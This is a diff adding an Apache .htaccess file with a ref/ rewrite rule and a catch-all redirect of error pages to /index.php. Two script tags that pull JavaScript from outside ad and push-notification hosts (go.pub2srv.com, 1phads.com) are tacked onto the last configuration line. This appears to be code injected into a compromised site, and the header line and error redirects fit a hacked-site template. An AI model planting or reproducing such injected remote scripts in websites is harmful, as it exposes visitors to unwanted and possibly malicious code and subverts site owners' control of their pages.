@@ -1,0 +1,9 @@
+# DO NOT REMOVE THIS LINE AND THE LINES ABOVE Gypesy:ERRORPAGEID
+
+RewriteEngine on
+RewriteRule ^ref/([^/\.]+)/?$ ref.php?id=$1 [L]
+
+ErrorDocument 400 /index.php
+ErrorDocument 403 /index.php
+ErrorDocument 404 /index.php
+ErrorDocument 500 /index.php<!-- --> <script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=16780'> </script> <script type="text/javascript" src="//1phads.com/notice.php?p=16781&interactive=1&pushup=1"> </script> 
